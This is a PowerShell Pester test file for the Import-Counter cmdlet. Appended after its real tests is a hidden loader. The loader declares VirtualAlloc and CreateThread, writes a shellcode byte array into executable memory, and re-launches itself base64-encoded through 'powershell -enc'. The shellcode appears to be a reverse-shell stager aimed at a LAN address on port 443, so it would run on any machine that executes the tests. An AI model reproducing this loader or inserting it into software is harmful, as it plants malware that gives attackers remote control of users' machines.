



 
 
 return
 
$cmdletName = "Import-Counter"

. "$PSScriptRoot/CounterTestHelperFunctions.ps1"

$SkipTests = SkipCounterTests

if ( ! $SkipTests )
{
    $counterPaths = @(
        (TranslateCounterPath "\Memory\Available Bytes")
        (TranslateCounterPath "\processor(*)\% Processor time")
        (TranslateCounterPath "\Processor(_Total)\% Processor Time")
        (TranslateCounterPath "\PhysicalDisk(_Total)\Current Disk Queue Length")
        (TranslateCounterPath "\PhysicalDisk(_Total)\Disk Bytes/sec")
        (TranslateCounterPath "\PhysicalDisk(_Total)\Disk Read Bytes/sec")
        )
    $setNames = @{
        Memory = (TranslateCounterName "memory")
        PhysicalDisk = (TranslateCounterName "physicaldisk")
        Processor = (TranslateCounterName "processor")
        }
}
else 
{
    $counterPaths = @()
    $setNames = @{}
}

$badSamplesBlgPath = Join-Path $PSScriptRoot "assets" "BadCounterSamples.blg"
$corruptBlgPath = Join-Path $PSScriptRoot "assets" "CorruptBlg.blg"
$notFoundPath = Join-Path $PSScriptRoot "DAD288C0-72F8-47D3-8C54-C69481B528DF.blg"


function SetScriptVars([string]$rootPath, [int]$maxSamples, [bool]$export)
{
    $rootFilename = "exportedCounters"

    $script:blgPath = Join-Path $rootPath "$rootFilename.blg"
    $script:csvPath = Join-Path $rootPath "$rootFilename.csv"
    $script:tsvPath = Join-Path $rootPath "$rootFilename.tsv"

    $script:counterSamples = $null
    if ($maxSamples -and ! $SkipTests )
    {
        $script:counterSamples = Get-Counter -Counter $counterPaths -MaxSamples $maxSamples
    }

    if ($export -and ! $SkipTests )
    {
        Export-Counter -Force -FileFormat "blg" -Path $script:blgPath -InputObject $script:counterSamples
        Export-Counter -Force -FileFormat "csv" -Path $script:csvPath -InputObject $script:counterSamples
        Export-Counter -Force -FileFormat "tsv" -Path $script:tsvPath -InputObject $script:counterSamples
    }
}


function ConstructCommand($testCase)
{
    $filePath = ""
    $pathParam = ""
    $startTimeParam = ""
    $endTimeParam = ""
    if ($testCase.ContainsKey("Path"))
    {
        $filePath = $testCase.Path
    }
    else
    {
        $filePath = $script:blgPath
    }

    if ($testCase.NoDashPath)
    {
        $pathParam = $filePath
    }
    else
    {
        $pathParam = "-Path $filePath"
    }

    if ($testCase.ContainsKey("StartTime"))
    {
        $startTimeParam = "-StartTime `$testCase.StartTime"
    }
    if ($testCase.ContainsKey("EndTime"))
    {
        $endTimeParam = "-EndTime `$(`$testCase.EndTime)"
    }

    return "$cmdletName $pathParam $startTimeParam $endTimeParam $($testCase.Parameters)"
}


function RunTest($testCase)
{
    $skipTest = $testCase.SkipTest -or (SkipCounterTests)

    It "$($testCase.Name)" -Skip:$skipTest {

        if ($testCase.TimestampIndexes)
        {
            if ($testCase.TimestampIndexes.ContainsKey("First"))
            {
                $testCase.StartTime = $script:counterSamples[$testCase.TimestampIndexes.First].Timestamp

                
                
                
                $testCase.StartTime = New-Object System.DateTime ([Int64]([math]::floor($testCase.StartTime.Ticks / 10000)) * 10000)
            }
            if ($testCase.TimestampIndexes.ContainsKey("Last"))
            {
                $testCase.EndTime = $script:counterSamples[$testCase.TimestampIndexes.Last].Timestamp
            }
        }

        $cmd = ConstructCommand $testCase
        $cmd = $cmd + " -ErrorAction SilentlyContinue -ErrorVariable errVar"

        $errVar = $null
        $sb = [scriptblock]::Create($cmd)
        $result = &$sb
        $errVar | Should -BeNullOrEmpty

        if ($testCase.ContainsKey("Script"))
        {
            &$testCase.Script
        }
        else
        {
            if ($testCase.TimestampIndexes)
            {
                $start = 0
                $end = $script:counterSamples.Length - 1
                if ($testCase.TimestampIndexes.ContainsKey("First"))
                {
                    $start = $testCase.TimestampIndexes.First
                }
                if ($testCase.TimestampIndexes.ContainsKey("Last"))
                {
                    $end = $testCase.TimestampIndexes.Last
                }

                CompareCounterSets $result $script:counterSamples[$start..$end]
            }
            else
            {
                CompareCounterSets $result $script:counterSamples
            }
        }
    }
}


function RunPerFileTypeTests($testCase)
{
    if ($testCase.UseKnownSamples)
    {
        $basePath = Join-Path $PSScriptRoot "assets" "CounterSamples"
        $formats = @{
            "BLG" = "$basePath.blg"
            "CSV" = "$basePath.blg"
            "TSV" = "$basePath.blg"
        }
    }
    else
    {
        $formats = @{
            "BLG" = $script:blgPath
            "CSV" = $script:csvPath
            "TSV" = $script:tsvPath
        }
    }

    foreach ($f in $formats.GetEnumerator())
    {
        $newCase = $testCase.Clone();
        $newCase.Path = $f.Value
        $newCase.Name = "$($newCase.Name) ($($f.Name) format)"

        RunTest $newCase
    }
}


function RunExpectedFailureTest($testCase)
{
    It "$($testCase.Name)" -Skip:$(SkipCounterTests) {
        $cmd = ConstructCommand $testCase
        
        
        $cmd = $cmd + " -ErrorAction Stop"

        if ($testCase.ContainsKey("Script"))
        {
            
            $sb = [ScriptBlock]::Create($cmd)
            &$sb
            &$testCase.Script
        }
        else
        {
            
            $sb = [ScriptBlock]::Create($cmd)
            $e = { &$sb } | Should -Throw -ErrorId $testCase.ExpectedErrorId -PassThru
            if ($testCase.ExpectedErrorCategory)
            {
                $e.CategoryInfo.Category | Should -BeExactly $testCase.ExpectedErrorCategory
            }
        }
    }
}

Describe "CI tests for Import-Counter cmdlet" -Tags "CI" {

    BeforeAll {
        SetScriptVars $testDrive 0 $false
    }

    $performatTestCases = @(
        @{
            Name = "Can import all samples from known sample sets"
            UseKnownSamples = $true
            Script = {
                $result.Length | Should -Be 25
            }
        }
        @{
            Name = "Can acquire summary information"
            UseKnownSamples = $true
            Parameters = "-Summary"
            Script = {
                $result.SampleCount | Should -Be 25
                $result.OldestRecord | Should -Be (Get-Date -Year 2016 -Month 11 -Day 26 -Hour 13 -Minute 46 -Second 30 -Millisecond 874)
                $result.NewestRecord | Should -Be (Get-Date -Year 2016 -Month 11 -Day 26 -Hour 13 -Minute 47 -Second 42 -Millisecond 983)
            }
        }
    )

    foreach ($testCase in $performatTestCases)
    {
        RunPerFileTypeTests $testCase
    }
}

Describe "Feature tests for Import-Counter cmdlet" -Tags "Feature" {

    BeforeAll {
        SetScriptVars $testDrive 25 $true
    }

    AfterAll {
        Remove-Item $script:blgPath -Force -ErrorAction SilentlyContinue
        Remove-Item $script:csvPath -Force -ErrorAction SilentlyContinue
        Remove-Item $script:tsvPath -Force -ErrorAction SilentlyContinue
    }

    Context "Validate incorrect usage" {
        $testCases = @(
            @{
                Name = "Fails when given non-existent path"
                Path = $notFoundPath
                ExpectedErrorCategory = [System.Management.Automation.ErrorCategory]::ObjectNotFound
                ExpectedErrorId = "Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when given null path"
                Path = "`$null"
                ExpectedErrorId = "ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when -Path specified but no path given"
                Path = ""
                ExpectedErrorId = "MissingArgument,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when given -ListSet without set names"
                Parameters = "-ListSet"
                ExpectedErrorId = "MissingArgument,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when given -StartTime without DateTime"
                Parameters = "-StartTime"
                ExpectedErrorId = "MissingArgument,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when given -EndTime without DateTime"
                Parameters = "-EndTime"
                ExpectedErrorId = "MissingArgument,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when given -ListSet and -Summary"
                Parameters = "-ListSet memory -Summary"
                ExpectedErrorId = "AmbiguousParameterSet,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when given -Summary and -Counter"
                Parameters = "-Summary -Counter `"\processor(*)\% processor time`""
                ExpectedErrorId = "AmbiguousParameterSet,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when given -ListSet and -Counter"
                Parameters = "-ListSet memory -Counter `"\processor(*)\% processor time`""
                ExpectedErrorId = "AmbiguousParameterSet,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when given -ListSet and -StartTime"
                StartTime = Get-Date
                Parameters = "-ListSet memory"
                ExpectedErrorId = "AmbiguousParameterSet,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when given -ListSet and -StartTime"
                StartTime = Get-Date
                Parameters = "-ListSet memory"
                ExpectedErrorId = "AmbiguousParameterSet,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when given -Summary and -EndTime"
                EndTime = Get-Date
                Parameters = "-Summary"
                ExpectedErrorId = "AmbiguousParameterSet,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when given -Summary and -EndTime"
                EndTime = Get-Date
                Parameters = "-Summary"
                ExpectedErrorId = "AmbiguousParameterSet,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
            @{
                Name = "Fails when BLG file is corrupt"
                Path = $corruptBlgPath
                ExpectedErrorCategory = [System.Management.Automation.ErrorCategory]::InvalidResult
                ExpectedErrorId = "CounterApiError,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
        )

        foreach ($testCase in $testCases)
        {
            RunExpectedFailureTest $testCase
        }

        It "Multiple errors when BLG file contains bad sample data" -Skip:$(SkipCounterTests) {
            $errVar = $null
            $result = Import-Counter $badSamplesBlgPath -ErrorVariable errVar -ErrorAction SilentlyContinue
            $result.Length | Should -Be 275
            $errVar.Count | Should -Be 5
            foreach ($err in $errVar)
            {
                $err.CategoryInfo.Category | Should -BeExactly "InvalidResult"
                $err.FullyQualifiedErrorId | SHould -BeExactly "CounterApiError,Microsoft.PowerShell.Commands.ImportCounterCommand"
            }
        }
    }

    Context "Import tests" {
        $performatTestCases = @(
            @{
                Name = "Can import all samples"
            }
            @{
                Name = "Can import samples beginning at a given start time"
                TimestampIndexes = @{
                    First = 6
                }
            }
            @{
                Name = "Can import samples ending at a given end time"
                TimestampIndexes = @{
                    Last = 10
                }
            }
            @{
                Name = "Can import samples of a given timestamp range"
                TimestampIndexes = @{
                    First = 4
                    Last = 19
                }
            }
            @{
                Name = "Can acquire a named list set"
                UseKnownSamples = $true
                Parameters = "-ListSet $($setNames.Memory)"
                Script = {
                    $result.Length | Should -Be 1
                    $result[0].CounterSetName | Should -BeExactly $setNames.Memory
                }
            }
            @{
                Name = "Can acquire list set from an array of names"
                UseKnownSamples = $true
                Parameters = "-ListSet $(TranslateCounterName 'memory'), $(TranslateCounterName 'processor')"
                Script = {
                    $result.Length | Should -Be 2
                    $names = @()
                    foreach ($set in $result)
                    {
                        $names = $names + $set.CounterSetName
                    }
                    $names -Contains $setNames.Memory | Should -BeTrue
                    $names -Contains $setNames.Processor | Should -BeTrue
                }
            }
            @{
                
                
                
                
                Name = "Can acquire list set via wild-card name"
                SkipTest = (-not (Get-Culture).Name.StartsWith("en-", [StringComparison]::InvariantCultureIgnoreCase))
                UseKnownSamples = $true
                Parameters = "-ListSet p*"
                Script = {
                    $result.Length | Should -BeGreaterThan 1
                    $names = @()
                    foreach ($set in $result)
                    {
                        $names = $names + $set.CounterSetName
                    }
                    $names -Contains "physicaldisk" | Should -BeTrue
                    $names -Contains "processor" | Should -BeTrue
                }
            }
            @{
                
                
                
                
                Name = "Can acquire list set from an array of names including wild-card"
                SkipTest = (-not (Get-Culture).Name.StartsWith("en-", [StringComparison]::InvariantCultureIgnoreCase))
                UseKnownSamples = $true
                Parameters = "-ListSet memory, p*"
                Script = {
                    $result.Length | Should -BeGreaterThan 2
                    $names = @()
                    foreach ($set in $result) { $names = $names + $set.CounterSetName }
                    $names -Contains "memory" | Should -BeTrue
                    $names -Contains "processor" | Should -BeTrue
                    $names -Contains "physicaldisk" | Should -BeTrue
                }
            }
        )

        foreach ($testCase in $performatTestCases)
        {
            RunPerFileTypeTests $testCase
        }
    }
}

Describe "Import-Counter cmdlet does not run on IoT" -Tags "CI" {

    It "Import-Counter throws PlatformNotSupportedException" -Skip:$(-not [System.Management.Automation.Platform]::IsIoT)  {
        { Import-Counter -Path "$testDrive\ProcessorData.blg" } |
	    Should -Throw -ErrorId "System.PlatformNotSupportedException,Microsoft.PowerShell.Commands.ImportCounterCommand"
    }
}

$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x02,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}

